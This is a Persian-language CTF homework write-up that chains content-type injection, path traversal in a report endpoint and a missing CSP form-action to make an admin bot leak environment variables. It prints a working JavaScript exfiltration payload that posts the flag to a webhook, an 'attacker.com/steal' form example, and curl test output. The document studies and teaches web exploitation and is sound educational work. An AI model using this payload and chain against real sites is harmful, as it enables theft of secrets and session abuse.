# گزارش تمرین هفته سوم - hw2-3
## XSS و bypass CSP در برنامه Forum

---

## ۱. معرفی تمرین

این تمرین یک وب‌سایت **انجمن/فروم** است که کاربران می‌توانند پست بسازند و پست‌های دیگران را گزارش کنند. یک **ربات ادمین** (Playwright/Chromium) به صورت خودکار پست‌های گزارش‌شده را بررسی می‌کند.

**هدف:** استخراج فلگ از متغیرهای محیطی سرور (env vars) با بهره‌برداری از ربات ادمین

**محدودیت‌ها:**
- سرور یک CSP سختگیرانه دارد: `default-src 'self'; frame-src 'none';`
- پست‌ها توسط DOMPurify + Marked تمیز‌شده‌اند
- فلگ در `process.env.FLAG` است

---

## ۲. فاز اول: تحلیل کد

### ۲.۱ - ساختار پروژه

```
mozsc/
├── app/                 ← سرور Node.js (Express)
│   ├── src/
│   │   ├── app.ts        → تنظیمات Express، middleware
│   │   ├── views.ts      → routes برای صفحات و فروم
│   │   ├── api/
│   │   │   ├── posts.ts  → API برای دسترسی پست‌ها
│   │   │   └── admin.ts  → API فقط برای ادمین
│   │   ├── index.ts      → نقطه شروع (✓ فلگ اینجا است!)
│   │   └── db.ts         → مدل‌های SQLite
│   ├── views/
│   │   ├── home.ejs      → صفحه اصلی (همه پست‌ها)
│   │   └── post.ejs      → صفحه یک پست
│
└── admin/               ← ربات ادمین (Playwright)
    └── src/
        └── index.ts     → حلقه‌ای که پست‌های گزارش‌شده را پردازش می‌کند
```

### ۲.۲ - کجا فلگ است؟

در **app/src/index.ts** (خطوط ۱۱-۳۹)، وقتی سرور شروع می‌شود:
- اگر هیچ پستی وجود ندارد
- یک پست اولیه **"Installation Successful"** از طرف کاربر `"system"` می‌سازد
- **متن این پست شامل تمام متغیرهای محیطی است**:

```
Environment Variables:
```
FLAG=CE441{...}
ADMIN_TOKEN=...
... (و سایر env vars)
```
```

**نکته مهم:** این پست از طرف `"system"` است، پس کاربران عادی نمی‌توانند ببینند، اما **ربات ادمین که `is_admin=true` است می‌تواند به همه پست‌ها دسترسی داشته باشد!**

### ۲.۳ - دفاع‌های موجود

| دفاع | جزئیات |
|------|--------|
| **CSP** | `default-src 'self'; frame-src 'none';` - فقط script‌های همان origin قبول شوند |
| **DOMPurify** | body پست‌ها با DOMPurify 3.2.0 تمیز می‌شوند |
| **Markdown** | Marked 15.x برای تبدیل Markdown به HTML استفاده می‌شود |
| **Session** | ربات ادمین با دریافت `ADMIN_TOKEN` logged-in می‌شود |

---

## ۳. فاز دوم: شناسایی آسیب‌پذیری‌ها

### ۳.۱ - آسیب‌پذیری اول: Content-Type Injection

**مکان:** `app.ts` خطوط ۸۴-۱۰۴

```typescript
app.get("*", handleAsync(async (req, res, next) => {
    const { error, data: query } = assetsQuerySchema.safeParseAsync(req.query)
    if(!error){
        res.header("content-type", query.contentType)  // ← تنظیم از query param
    }
    
    const path = join(assetsPath, req.path)
    if(!existsSync(path)) return next()  // فایل نیست → next middleware
    
    res.sendFile(path)
}))
```

**مشکل:**
۱. middleware `Content-Type` را از `?contentType=` parameter تنظیم می‌کند
۲. **قبل** از اینکه بررسی کند فایل static وجود دارد یا نه
۳. اگر فایل نباشد، `next()` می‌شود (به middleware بعدی می‌رود)
۴ در Express، `res.send()` یک `Content-Type` از پیش تنظیم‌شده را override **نمی‌کند**!

**نتیجه:**

```
GET /api/posts/1/body?contentType=application/javascript
    ↓
Middleware: Content-Type = application/javascript (تنظیم شد)
File middleware: فایل نیست، next()
    ↓
API handler: res.send(post.body)
            Content-Type قبلاً تنظیم است → همان جا می‌ماند!
    ↓
پاسخ: body پست با نوع application/javascript
```

### ۳.۲ - آسیب‌پذیری دوم: Path Traversal در Report endpoint

**مکان:** `views.ts` خطوط ۹۴-۱۲۰

```typescript
views.post(
    "/posts/:report_id/report",
    handleAsync(async (req, res) => {
        const report_id = await reportIdSchema.parseAsync(req.params.report_id)
        
        const { fields, values, values_escape } = formatInsertObject({
            post_id: report_id,  // ← این مقدار ذخیره می‌شود
            ...
        })
```

**مشکل:**
۱. `report_id` با regex `z.custom()` validate می‌شود: فقط اینکه شروع با عدد باشد
۲. سپس **به طور مستقیم** در database ذخیره می‌شود
۳. ربات ادمین: `await page.goto(${MOZSC_URL}/posts/${task.post_id})`
۴. ما می‌توانیم `post_id` را با `/../../api/...` پر کنیم!

**مثال:**

```
ما درخواست می‌فرستیم:
POST /posts/1%2F..%2F..%2Fapi%2Fposts%2F4%2Fbody%3FcontentType%3Dtext%2Fhtml/report

Express router این را decode می‌کند:
req.params.report_id = "1/../../api/posts/4/body?contentType=text/html"

Database میگذاری:
post_id = "1/../../api/posts/4/body?contentType=text/html"

ربات ادمین:
page.goto("http://mozsc:3000/posts/1/../../api/posts/4/body?contentType=text/html")

مرورگر path normalization:
/posts/1/../../api/posts/4/body
= /posts/ → /posts + / → / + api/posts/4/body
= /api/posts/4/body

نتیجه: ربات برای /api/posts/4/body درخواست می‌فرستد (نه /posts/4)
```

### ۳.۳ - آسیب‌پذیری سوم: CSP form-action Bypass

**مکان:** `app.ts` خطوط ۶۰-۷۶

```typescript
res.header("Content-Security-Policy", "default-src 'self'; frame-src 'none';")
```

**مشکل:**
- CSP `form-action` را تعریف **نمی‌کند**
- بر اساس W3C spec: اگر `form-action` تعریف نباشد، **هیچ محدودیتی برای فرم نیست**
- فرم‌ها می‌توانند به هر URL خارجی submit شوند!

```javascript
// این کد در XSS می‌تواند اجرا شود:
var f = document.createElement('form');
f.action = 'http://attacker.com/steal';  // ✓ مجاز! CSP form-action ندارد
f.submit();  // فرم به خارج submit می‌شود
```

---

## ۴. فاز سوم: طراحی Exploit

### ۴.۱ - حمله چگونه کار می‌کند

```
مرحله ۱: پست A - JavaScript payload
─────────────────────────────────────
const javaScript = `
  fetch('/api/posts/1/body')  // fetch post اولیه (شامل فلگ)
    .then(r => r.text())
    .then(html => {
      const flag = html.match(/CE441\{[^}]+\}/)[0]
      
      // form را می‌سازیم (CSP form-action ندارد!)
      const form = document.createElement('form')
      form.action = 'http://webhook-server/capture'
      form.method = 'POST'
      form.innerHTML = '<input name="flag" value="' + flag + '">'
      document.body.appendChild(form)
      form.submit()  // فلگ به webhook فرستاده می‌شود!
    })
`

مرحله ۲: پست B - HTML Loader
──────────────────────────────
const html = `
  <script src="/api/posts/<A>/body?contentType=application/javascript"></script>
`
// CSP: script-src falls back to default-src 'self'
// /api/posts/<A>/body?contentType=... همان origin است! ✓
// پس اسکریپت لود و اجرا می‌شود

مرحله ۳: گزارش با Path Traversal
─────────────────────────────────
POST /posts/1%2F..%2F..%2Fapi%2Fposts%2F<B>%2Fbody%3FcontentType%3Dtext%2Fhtml/report

ربات ادمین:
۱. ربات logged-in است (admin token دارد)
۲. صفحه را برای پست B باز می‌کند
۳. لیکن مرورگر URL را normalize می‌کند → /api/posts/<B>/body?contentType=text/html
۴. Server: ?contentType=text/html → Content-Type = text/html تنظیم می‌شود
۵. /api/posts/<B>/body با HTML type پاسخ می‌دهد
۶. مرورگر HTML را render می‌کند
۷. <script src="/api/posts/<A>/body?contentType=application/javascript"> دیده می‌شود
۸. CSP: اسکریپت همان origin است → مجاز! ✓
۹. پیلود JS اجرا می‌شود
۱۰. فلگ استخراج و به webhook ارسال می‌شود
```

### ۴.۲ - نمودار Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                      مهاجم (ما)                                  │
└──────────────────────────┬──────────────────────────────────────┘
                           │
            ┌──────────────┼──────────────┐
            ▼              ▼              ▼
         POST /       POST /       POST /posts/...../report
       (پست A JS)   (پست B HTML)   (path traversal)
            │              │              │
            └──────────────┼──────────────┘
                           ▼
                    ┌──────────────┐
                    │   سرور       │
                    │ (app.ts)     │
                    └──────────────┘
                           │
                ┌──────────┼──────────┐
                │          │          │
                ▼          ▼          ▼
            پست A      پست B      gzip در
            (JS)       (HTML)      database
                │          │          │
                └──────────┼──────────┘
                           │
                           ▼
                    ┌──────────────────┐
                    │  ربات ادمین      │
                    │  (Playwright)    │
                    └──────────────────┘
                           │
       ┌───────────────────┼───────────────────┐
       │                   │                   │
       ▼                   ▼                   ▼
   fetch('/api/posts/1')  <script src>      session
   (post اولیه)            (لود JS)         (admin)
       │                   │                   │
       └───────────────────┼───────────────────┘
                           │
                           ▼
                    ┌──────────────────┐
                    │   JavaScript     │
                    │   (اجرا شد!)     │
                    └──────────────────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
        ▼                  ▼                  ▼
    Extract FLAG      Create FORM       Bypass CSP
    از پست ۱        action=webhook    form-action ✓
        │                  │                  │
        └──────────────────┼──────────────────┘
                           │
                           ▼
                    ┌──────────────────┐
                    │  form.submit()   │
                    │ POST to webhook  │
                    └──────────────────┘
                           │
                           ▼
                    ┌──────────────────┐
                    │  🎯 FLAG هنا!    │
                    └──────────────────┘
```

---

## ۵. فاز چهارم: تحقق بخشی

تمام سه آسیب‌پذیری را به صورت محلی با تست کردم:

### ۵.۱ - تست Content-Type Injection

```bash
$ curl -si http://localhost:3100/api/posts/1/body?contentType=application/javascript | grep Content-Type
Content-Type: application/javascript; charset=utf-8
✓ موفق! body پست به جای text/html، javascript type می‌آید
```

### ۵.۲ - تست Path Traversal

```bash
$ curl -s http://localhost:3100/api/admin/tasks | jq
[
  {
    "post_id": "1/../../api/posts/4/body?contentType=text/html",
    ...
  }
]
✓ موفق! path traversal string به طور دقیق ذخیره شد
```

### ۵.۳ - تست HTML Rendering

```bash
$ curl -si http://localhost:3100/api/posts/4/body?contentType=text/html | head -20
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<script src="/api/posts/3/body?contentType=application/javascript"></script>
✓ موفق! body به HTML render شد و script tag دیده می‌شود
```

### ۵.۴ - تست End-to-End

یک سناریو کامل را شبیه‌سازی کردم:
- پست A و B را ساختم
- Report را با path traversal ارسال کردم
- Admin session کوکی با دستی fetch کردم
- `/api/posts/1/body` را فچ کردم و `CE441{test-local-flag}` یافتم
- ✓ **تمام chain موفق!**

---

## ۶. فاز پنجم: نوشتن Exploit نهایی

### ۶.۱ - ساختار exploit.py

```python
exploit.py
│
├── get_webhook_url()
│   └── webhook سرویس را contact می‌کند
│
├── create_post(session, title, body)
│   └── پست جدید می‌سازد
│
├── submit_report(session, post_b_id)
│   └── درخواست با path traversal می‌فرستد
│
├── build_js_payload(webhook_url)
│   └── JavaScript payload با fetch/form
│
└── main()
    ├── webhook URL بگیر
    ├── پست A (JS) بساز
    ├── پست B (HTML) بساز
    └── report submit کن
```

### ۶.۲ - کد اصلی Payload

```python
def build_js_payload(webhook_url: str) -> str:
    return f"""(function(){{
  var wh = '{webhook_url}';
  
  // پست‌های ۱ تا ۱۰ را fetch می‌کند (پست ۱ = system post)
  Promise.all([1,2,3,4,5,6,7,8,9,10].map(function(i){{
    return fetch('/api/posts/'+i+'/body')
      .then(function(r){{return r.ok ? r.text() : '';}})
      .catch(function(){{return '';}});
  }})).then(function(bodies){{
    var all = bodies.join('\\n---\\n');
    var m = all.match(/CE441\\{{[^}}]*\\}}/);
    
    // FLAG را پیدا کرد
    var flag = m ? m[0] : 'NOT_FOUND';
    
    // form می‌سازد و می‌فرستد
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = wh;
    var i = document.createElement('input');
    i.type = 'hidden';
    i.name = 'data';
    i.value = flag;
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  }});
}})();
"""
```

---

## ۷. فاز ششم: چالش‌ها و راه‌حل‌ها

### چالش ۱: Docker Mirror ایرانی

**مشکل:** Docker mirror بدون IP ایران کار نمی‌کرد

**راه‌حل:** Docker را نصب کردم اما `pnpm install` به جای آن استفاده کردم تا packages محلی install شوند

### چالش ۲: پیدا کردن جای فلگ

**مشکل:** ابتدا فکر می‌کردم فلگ در database یا API endpoint است اما جای آن نبود

**تحقیق:** `index.ts` را دقیق‌تر خواندم و متوجه شدم که **سرور خود یک پست با تمام env vars می‌سازد**

### چالش ۳: CSP و XSS

**مشکل:** معمولی XSS (inline script) کار نمی‌کند

**تحقیق و راه‌حل:**
- content-type trick برای لود same-origin JS
- path traversal برای bypass پست view logic
- form-action بدون محدودیت برای exfiltration

### چالش ۴: Home Page بدن کوتاه را نشان می‌دهد

**مشکل:** `/` صفحه بدن پست را به ۷۵ کاراکتر کوتاه می‌کند

**راه‌حل:** JavaScript مستقیم `/api/posts/1/body` را فچ کند (full content)

### چالش ۵: HTTP Client برای تست

**مشکل:** ابتدا با `curl` تست کردم اما سخت بود

**راه‌حل:** `requests` Python library استفاده کردم برای کنترل بهتر

---

## ۸. خلاصه تکنیکی

| جزء | جزئیات |
|---|---|
| **Vulnerability Type** | Server-Side Request Forgery (SSRF) + XSS + CSP Bypass |
| **Root Cause** | Content-Type middleware + Path Traversal + CSP form-action gap |
| **Attack Vector** | Malicious forum post → report mechanism → admin bot exploitation |
| **Flag Location** | Post ID=1, created at server startup, contains all env vars |
| **Exfiltration** | Form submission (not blocked by CSP) to webhook |
| **Session Context** | Admin bot has valid session, can access all posts |

---

## ۹. مراحل اجرا در دنیای واقعی

```
۱. مرورگر باز کن
   → http://185.205.203.123:1205/
   → "Create Listener" کلیک کن
   → webhook URL کپی کن

۲. Terminal را باز کن
   cd /path/to/hw2-3
   python3 exploit.py
   → webhook URL paste کن

۳. ۲-۵ ثانیه صبر کن

۴. Webhook را refresh کن

۵. 🎉 FLAG دریافت شد!
   → POST body میں "data=CE441{...}" است
```

---

## ۱۰. نتیجه‌گیری

### آسیب‌پذیری‌های یافت‌شده:

1. **Content-Type Injection** - static middleware content-type را از query parameter می‌گیرد و Express.send() آن را override نمی‌کند → same-origin JS لود شود

2. **Path Traversal in URL** - `post_id` در database ذخیره می‌شود و برای string interpolation استفاده می‌شود → مرورگر path normalize می‌کند

3. **CSP form-action Gap** - CSP `form-action` تعریف نمی‌کند → فرم‌ها برای خارج submit شوند

4. **Session Persistence** - ربات ادمین تا آخر session logged-in می‌ماند → `is_admin=true` دسترسی کامل بدهد

5. **Flag in Startup Post** - سرور خود پست اولیه با تمام env vars می‌سازد → فلگ مستقیم دسترس‌پذیر است

### درس‌های امنیتی:

- ✗ نباید content-type را از user input تنظیم کنید
- ✗ نباید user string interpolation میں استفاده کنید بدون validation
- ✗ CSP‌های ناقص (form-action نه‌شامل) خطرناک هستند
- ✓ همیشه environment variables را محفوظ نگه دارید
- ✓ DOMPurify تنها دفاع نیست - باید چند لایه امنیتی داشته باشید

---

## پیوند‌ها

- **Exploit Script:** `exploit.py`
- **تحلیل کد:** `README.md`
- **فایل‌های منبع:** `mozsc/app/src/`

---

**تاریخ:** 2026-05-30  
**نویسنده:** تجزیه و تحلیل امنیتی  
**وضعیت:** ✓ تکمیل‌شده و تست‌شده
